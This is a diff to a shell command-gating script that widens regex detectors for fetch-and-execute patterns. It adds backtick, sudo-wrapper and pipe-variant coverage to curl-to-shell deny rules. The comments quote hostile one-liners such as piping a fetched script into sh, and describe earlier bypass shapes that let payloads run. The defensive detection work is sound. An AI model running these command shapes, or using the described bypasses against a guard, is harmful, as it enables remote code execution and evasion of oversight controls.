@@ -1464,10 +1464,23 @@ fi
 # §8 false-negative audit: this class had no detector at all.
 bypass_curlsh=0
 if echo "$CMD" | grep -qF '[allow-curl-sh]'; then bypass_curlsh=1; fi
-# Command-position anchor `[|;&({]` includes `{` so a brace-group `{ curl … |
-# sh; }` is caught like the subshell `( … )` form (code review 2026-07-03). A
-# var like `${curl}` cannot false-match: the trailing `[[:space:]]` after curl
+# Command-position anchor `[|;&({`]` includes `{` so a brace-group `{ curl … |
+# sh; }` is caught like the subshell `( … )` form (code review 2026-07-03), and
+# a BACKTICK because a backtick body is executed exactly like `$( … )` — bare or
+# inside "…" alike. Without it, `` `curl http://x/i.sh | sh` `` ALLOWED: this
+# gate segments on `&&`/`||`/`;` only (a single `|` has to survive for the pipe
+# test), the leading-opener strip below takes `(` and `{` but not a backtick, so
+# the fetch word sat at a position no anchor described. The rm and npx gates
+# never had this hole — s8_split_segments splits on a backtick — and
+# `_revsh_anchor` already carried one; this is the third gate catching up.
+# A var like `${curl}` cannot false-match: the trailing `[[:space:]]` after curl
 # requires a space, which `${curl}` (curl followed by `}`) never has.
+# CURLSH_PIPE also gained the fetch-side ${CURLSH_WRAPSEQ} its three siblings
+# (PROCSUB, CMDSUB, CMDSUB_BT) already carried. The segment loop below strips
+# wrappers, but only at the START of a segment, so a wrapper sitting after a
+# MID-segment anchor (`` `sudo curl … | bash` ``) was reachable by no path at
+# all. Widening a deny-on-match regex is FP-direction only, and the fetch word
+# after the prefix must still be a literal CURLSH_SRC word.
 # Transparent exec-wrappers on the SINK, at parity with the rm/npx gates (which
 # strip env/command/nohup/setsid/time/busybox + nice/stdbuf/ionice/chrt/sudo/doas
 # — see the segment loop ~line 528). The curl-sh gate is pure regex, so the same
@@ -1581,14 +1594,20 @@ CURLSH_SHSINK='(sh|bash|zsh|dash|ksh|ash)'
 # denied both. Hence `[;&|)}]|$` (end of command) rather than the shell family's
 # `[[:space:])}]|$` (which permits trailing args).
 CURLSH_INTERP='(python|python2|python3|perl|ruby|node|php|lua)'
-CURLSH_SINKEXPR="(${CURLSH_SHSINK}([[:space:])}]|$)|${CURLSH_INTERP}([[:space:]]+-)?[[:space:]]*([;&|)}]|$)|awk[[:space:]]+-f[[:space:]]+-[[:space:]]*([;&|)}]|$))"
+# The sink TERMINATOR classes carry a backtick for the same reason the anchor
+# does: in `` `curl … | sh` `` the sink word ends at the closing backtick, which
+# is neither whitespace, a group closer, nor end-of-string — so the anchor fix
+# alone still matched nothing. Both ends of the expression had to learn the same
+# character (measured: with only the anchor widened, all four backtick corpus
+# rows stayed green-as-allow).
+CURLSH_SINKEXPR="(${CURLSH_SHSINK}([[:space:])}\`]|$)|${CURLSH_INTERP}([[:space:]]+-)?[[:space:]]*([;&|)}\`]|$)|awk[[:space:]]+-f[[:space:]]+-[[:space:]]*([;&|)}\`]|$))"
 # F27 (2026-07-25 deep audit): three delivery shapes the pipe form did not model.
 # `|&` is bash's pipe-stderr-too operator — a one-character variation on the
 # canonical denied form; and a group opener (`| { bash; }`, `| (bash)`) pushes the
 # sink one token right of where the regex looked. Both were live ALLOWs whose
 # payload ran (sandbox-confirmed). The sink word itself is unchanged, so a
 # non-shell group (`| { jq .; }`) still cannot match.
-CURLSH_PIPE="(^|[|;&({])[[:space:]]*${CURLSH_SRC}[[:space:]].*\|&?[[:space:]]*([({][[:space:]]*)?${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_SINKEXPR}"
+CURLSH_PIPE="(^|[|;&({\`])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SRC}[[:space:]].*\|&?[[:space:]]*([({][[:space:]]*)?${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_SINKEXPR}"
 # `source` and `.` are builtins that EXECUTE their file argument in the current
 # shell; `source <(curl x)` / `. <(curl x)` run fetched code just like `bash <(curl
 # x)` (v0.39.0 §8 FN closure F4). `\.` = literal dot (command position), no FP —
@@ -1607,7 +1626,7 @@ CURLSH_PIPE="(^|[|;&({])[[:space:]]*${CURLSH_SRC}[[:space:]].*\|&?[[:space:]]*([
 # halves able to disagree. No new FP surface: `<(` immediately followed by a
 # CURLSH_SRC word is still required, so `python3 <(echo hi)` and
 # `node <(cat local.js)` are untouched.
-CURLSH_PROCSUB="(^|[|;&({])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}(source|\.|sh|bash|zsh|dash|ksh|ash|${CURLSH_INTERP})[[:space:]]+(<[[:space:]]*)?<\([[:space:]]*${CURLSH_SRC}[[:space:]]"
+CURLSH_PROCSUB="(^|[|;&({\`])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}(source|\.|sh|bash|zsh|dash|ksh|ash|${CURLSH_INTERP})[[:space:]]+(<[[:space:]]*)?<\([[:space:]]*${CURLSH_SRC}[[:space:]]"
 curlsh_hit=0
 while IFS= read -r cseg; do
   # 2026-07-24 audit P1-1: strip leading subshell/brace openers, env-assignments
@@ -1715,8 +1734,8 @@ fi
 _ncmd_hit=0
 _ncmd_rule=""
 CURLSH_RUNNERC="(${CURLSH_SHSINK}([[:space:]]+-[a-zA-Z-]+)*[[:space:]]+-[a-zA-Z]*c[a-zA-Z]*|eval|source|\.)"
-CURLSH_CMDSUB="(^|[|;&({])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_RUNNERC}[[:space:]]+[\"']?\\\$\\([[:space:]]*${CURLSH_SRC}[[:space:]]"
-CURLSH_CMDSUB_BT="(^|[|;&({])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_RUNNERC}[[:space:]]+[\"']?\`[[:space:]]*${CURLSH_SRC}[[:space:]]"
+CURLSH_CMDSUB="(^|[|;&({\`])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_RUNNERC}[[:space:]]+[\"']?\\\$\\([[:space:]]*${CURLSH_SRC}[[:space:]]"
+CURLSH_CMDSUB_BT="(^|[|;&({\`])[[:space:]]*${CURLSH_WRAPSEQ}${CURLSH_SINKPFX}${CURLSH_RUNNERC}[[:space:]]+[\"']?\`[[:space:]]*${CURLSH_SRC}[[:space:]]"
 if printf '%s' "$NORMALIZED_CMD" | grep -qE "$CURLSH_CMDSUB" \
    || printf '%s' "$NORMALIZED_CMD" | grep -qE "$CURLSH_CMDSUB_BT"; then
   _ncmd_hit=1
